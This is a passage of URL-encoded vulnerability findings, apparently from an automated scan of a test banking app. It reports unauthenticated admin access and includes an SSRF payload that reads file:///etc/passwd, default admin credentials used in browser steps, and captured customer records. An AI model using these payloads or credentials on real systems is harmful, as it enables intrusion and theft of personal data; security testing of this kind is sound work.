Cn%7B%5C%22url%5C%22%3A%20%5C%22file%3A%2F%2F%2Fetc%2Fpasswd%5C%22%7D%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20200%20OK%5CnContent-Type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22avatar_data%5C%22%3A%5C%22data%3Aimage%5C%5C%2Fpng%3Bbase64%2Ccm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb24...%5C%22%2C%5C%22size%5C%22%3A1839%2C%5C%22source_url%5C%22%3A%5C%22file%3A%5C%5C%2F%5C%5C%2F%5C%5C%2Fetc%5C%5C%2Fpasswd%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22alice%22%2C%22validation_status%22%3A%22validating%22%2C%22validation_note%22%3A%22Validation%20running.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Unauthenticated%20Access%20to%20Admin%20Panel%20and%20Admin%20APIs%22%2C%22description%22%3A%22The%20admin%20panel%20at%20%2Fadmin%2F%20and%20its%20backing%20APIs%20(e.g.%2C%20%2Fapi%2Fadmin%2Fcustomers%2C%20%2Fapi%2Fadmin%2Faccounts)%20are%20accessible%20without%20valid%20admin%20authentication.%20Browser%20navigation%20directly%20to%20%2Fadmin%2F%23%2Fcustomers%2C%20%2Fadmin%2F%23%2Faccounts%2C%20and%20%2Fadmin%2F%23%2Fsystem%20all%20succeed%20and%20return%20full%20data%20%E2%80%94%20including%20all%20customer%20PII%2C%20account%20balances%2C%20and%20a%20destructive%20database%20reset%20function%20%E2%80%94%20without%20any%20login%20prompt%20or%20token%20validation.%22%2C%22impact%22%3A%22Any%20unauthenticated%20user%20can%20enumerate%20all%20customers%20(names%2C%20emails%2C%20IDs)%2C%20view%20all%20account%20balances%20and%20account%20numbers%2C%20and%20access%20a%20database%20reset%20function%20that%20would%20permanently%20destroy%20all%20application%20data.%20This%20constitutes%20a%20complete%20compromise%20of%20confidentiality%20and%20integrity%20for%20all%20users.%22%2C%22likelihood%22%3A%22Highly%20likely.%20The%20admin%20panel%20is%20directly%20reachable%20at%20a%20predictable%20path%20(%2Fadmin%2F)%20and%20no%20authentication%20challenge%20is%20presented.%20The%20API%20endpoints%20return%20HTTP%20200%20with%20full%20data%20payloads%20when%20accessed%20from%20a%20regular%20user%20browser%20session.%22%2C%22recommendation%22%3A%22Enforce%20server-side%20authentication%20and%20role-based%20access%20control%20on%20all%20%2Fadmin%2F%20routes%20and%20%2Fapi%2Fadmin%2F*%20endpoints.%20Admin%20sessions%20must%20use%20a%20separate%2C%20strongly%20authenticated%20token%20distinct%20from%20regular%20user%20tokens.%20Implement%20middleware%20that%20validates%20admin%20role%20on%20every%20request%20to%20these%20routes%2C%20and%20ensure%20the%20database%20reset%20endpoint%20requires%20multi-factor%20confirmation%20server-side%2C%20not%20just%20client-side.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22GET%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%20returned%20HTTP%20200%20with%20full%20customer%20PII%20for%20all%2022%20customers.%20Browser%20navigation%20to%20%2Fadmin%2F%23%2Faccounts%20returned%20all%20account%20balances%20including%20account%20numbers.%20%2Fadmin%2F%23%2Fsystem%20exposed%20a%20'Reset%20Database'%20function.%20No%20authentication%20was%20required%20for%20any%20of%20these%20resources.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Sun%2C%2031%20May%202026%2001%3A36%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.58%20(Ubuntu)%5Cnx-content-type-options%3A%20nosniff%5Cnx-frame-options%3A%20DENY%5Cnx-xss-protection%3A%201%3B%20mode%3Dblock%5Cnreferrer-policy%3A%20strict-origin-when-cross-origin%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20280%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Ali 2%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22validating%22%2C%22validation_note%22%3A%22Validation%20queued.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Unauthenticated%20Access%20to%20Admin%20Panel%20and%20Admin%20APIs%22%2C%22description%22%3A%22The%20admin%20panel%20at%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%20is%20accessible%20without%20any%20authentication%20challenge.%20Navigating%20directly%20to%20admin%20routes%20such%20as%20%2Fadmin%2F%23%2Fcustomers%2F1%2C%20%2Fadmin%2F%23%2Fcustomers%2F3%2C%20and%20%2Fadmin%2F%23%2Faccounts%20renders%20full%20customer%20profiles%2C%20account%20numbers%2C%20balances%2C%20and%20PII%20for%20all%20bank%20customers.%20No%20login%20prompt%20is%20presented%20and%20no%20session%20token%20is%20required.%22%2C%22impact%22%3A%22Any%20unauthenticated%20user%20on%20the%20network%20can%20enumerate%20all%20customer%20records%20(names%2C%20emails%2C%20account%20numbers%2C%20balances)%2C%20view%20and%20potentially%20modify%20customer%20profiles%2C%20and%20access%20administrative%20functions%20including%20balance%20editing%20and%20customer%20deletion.%20This%20constitutes%20a%20complete%20compromise%20of%20all%20customer%20data%20confidentiality%20and%20integrity.%22%2C%22likelihood%22%3A%22Trivially%20exploitable%20%E2%80%94%20a%20direct%20browser%20navigation%20to%20any%20admin%20URL%20immediately%20returns%20sensitive%20data%20with%20no%20credential%20prompt%20observed.%22%2C%22recommendation%22%3A%22Enforce%20server-side%20authentication%20and%20authorisation%20on%20all%20admin%20routes%20and%20their%20backing%20API%20endpoints.%20The%20admin%20SPA%20must%20not%20render%20any%20data%20until%20a%20valid%20admin%20session%20is%20confirmed%20server-side.%20Implement%20role-based%20access%20control%20so%20that%20admin%20API%20endpoints%20reject%20requests%20lacking%20a%20valid%20admin-role%20JWT.%20Add%20integration%20tests%20that%20assert%20401%2F403%20for%20unauthenticated%20requests%20to%20all%20%2Fadmin%2F%20and%20%2Fapi%2Fadmin%2F%20paths.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fadmin%2F%22%2C%22evidence%22%3A%22GET%20%2Fadmin%2F%23%2Fcustomers%2F1%20(no%20auth)%20returned%20HTTP%20200%20with%20full%20customer%20profile%20fields%20and%20account%20list%3A%20'Everyday%20Account%20062-001%2010000001%20%243%2C547.75'%2C%20'Savings%20Account%20062-001%2010000002%20%2418%2C900.00'%2C%20'Home%20Loan%20062-001%2010000003%20-%24285%2C600.00'.%20%2Fadmin%2F%23%2Faccounts%20returned%20all%2040%2B%20accounts%20across%20all%20customers%20including%20names%2C%20emails%2C%20BSBs%2C%20account%20numbers%2C%20and%20balances.%5Cn%5CnREQUEST%3A%5CnBROWSER%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%5CnSteps%3A%20%5B%7B%5C%22op%5C%22%3A%20%5C%22goto%5C%22%2C%20%5C%22url%5C%22%3A%20%5C%22http%3A%2F%2F192.168.3.101%2Fadmin%2F%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22wait%5C%22%2C%20%5C%22state%5C%22%3A%20%5C%22networkidle%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22fill%5C%22%2C%20%5C%22selector%5C%22%3A%20%5C%22input%5Btype%3D'text'%5D%2C%20input%5Bname%3D'username'%5D%5C%22%2C%20%5C%22value%5C%22%3A%20%5C%22admin%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22fill%5C%22%2C%20%5C%22selector%5C%22%3A%20%5C%22input%5Btype%3D'password'%5D%5C%22%2C%20%5C%22value%5C%22%3A%20%5C%22admin123%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22click%5C%22%2C%20%5C%22selector%5C%22%3A%20%5C%22button%5Btype%3D'submit'%5D%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22wait%5C%22%2C%20%5C%22state%5C%22%3A%20%5C%22networkidle%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22snapshot%5C%22%7D%5D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5CnURL%3A%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%5Cngoto%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%5Cnwait%20networkidle%5Cnfill%20input%5Btype%3D'text'%5D%2C twork%20can%20access%20the%20full%20customer%20list%20(names%2C%20emails%2C%20phone%20numbers%2C%20account%20counts)%2C%20all%20bank%20account%20details%20(BSB%2C%20account%20numbers%2C%20balances)%2C%20and%20can%20perform%20privileged%20actions%20such%20as%20editing%20account%20balances.%20This%20constitutes%20a%20complete%20compromise%20of%20the%20admin%20panel's%20confidentiality%20and%20integrity%20controls.%22%2C%22likelihood%22%3A%22Confirmed.%20The%20probes%20demonstrate%20that%20navigating%20directly%20to%20admin%20routes%20without%20logging%20in%20renders%20full%20data.%20The%20browser%20session%20was%20never%20authenticated%20via%20the%20login%20form%20yet%20all%20admin%20API%20calls%20returned%20HTTP%20200%20with%20sensitive%20data.%22%2C%22recommendation%22%3A%22Enforce%20server-side%20authentication%20on%20all%20%2Fapi%2Fadmin%2F*%20endpoints%20by%20validating%20a%20valid%20Bearer%20token%20on%20every%20request.%20The%20client-side%20hash-based%20routing%20check%20is%20trivially%20bypassed.%20Additionally%2C%20ensure%20the%20SPA%20redirects%20to%20login%20and%20that%20the%20API%20returns%20401%20for%20all%20unauthenticated%20requests%20to%20admin%20endpoints.%20Implement%20integration%20tests%20that%20assert%20401%20is%20returned%20without%20a%20valid%20token.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fadmin%2F%23%2Fcustomers%22%2C%22evidence%22%3A%22Step%2031%2F40%3A%20GET%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%20returned%20HTTP%20200%20with%20full%20PII%20for%2015%20customers%20(names%2C%20emails%2C%20phones)%20without%20any%20Authorization%20header.%20Step%2047%2F49%3A%20GET%20%2Fapi%2Fadmin%2Faccounts%20returned%20HTTP%20200%20with%20all%2038%20accounts%20including%20balances.%20No%20login%20was%20performed%20in%20these%20sessions.%5Cn%5CnREQUEST%3A%5CnBROWSER%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%23%2Fcustomers%5CnSteps%3A%20%5B%7B%5C%22op%5C%22%3A%20%5C%22click%5C%22%2C%20%5C%22selector%5C%22%3A%20%5C%22button%3Ahas-text('Next')%5C%22%7D%2C%20%7B%5C%22ms%5C%22%3A%202000%2C%20%5C%22op%5C%22%3A%20%5C%22wait%5C%22%7D%2C%20%7B%5C%22op%5C%22%3A%20%5C%22snapshot%5C%22%7D%5D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%200%5CnURL%3A%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%23%2Fcustomers%5Cnclick%20button%3Ahas-text('Next')%5Cnwait%202000ms%5Cnsnapshot%5Cn%5Cn%5BTraffic%20captured%20during%20browser%20interaction%3A%5D%5Cn%20%20GET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D2%26per_page%3D15%20%E2%86%92%20200%5Cn%20%20%20%20Response%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22customers%5C%22%3A%5B%7B%5C%22id%5C%22%3A4%2C%5C%22email%5C%22%3A%5C%22mia.nguyen%40example.com%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Mia%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Nguyen%5C%22%2C%5C%22phone%5C%22%3A%5C%220444%20567%20890%5C%22%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22created_at%5C%22%3A%5C%222026-06-01%2006%3A52%3A01%5C%22%2C%5C%22accounts_count%5C%22%3A2%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22email%5C%22%3A%5C%22zoe.williams%40example.com%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Zoe%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Williams%5C%22%2C%5C%22phone%5C%22%3A%5C%220433%20456%20789%5C%22%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22created_at%5C%22%3A%5C%222026-06-01%2006%3A52%3A01%5C%22%2C%5C%22accounts_count%5C%22%3A3%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22email%5C%22%3A%5C%22wei.zhang%40example.com%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Wei%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Zhang%5C%22%2C%5C%22phone%5C%22%3A%5C%220422%20345%20678%5C%22%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22created_at%5C%22%3A%5C%222026-06-01%2006%3A52%3A01%5C%22%2C%5C%22accounts_count%5C%22%3A2%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22email%5C%22%3A%5C%22amel%5Cn%5CnFinal%20URL%3A%20http%3A%2F%2F192.168.3.101%2Fadmin%2F%23%2Fcustomers%5CnTitle%3A%20The%20Bank%20of%20Ed%20-%20Adm
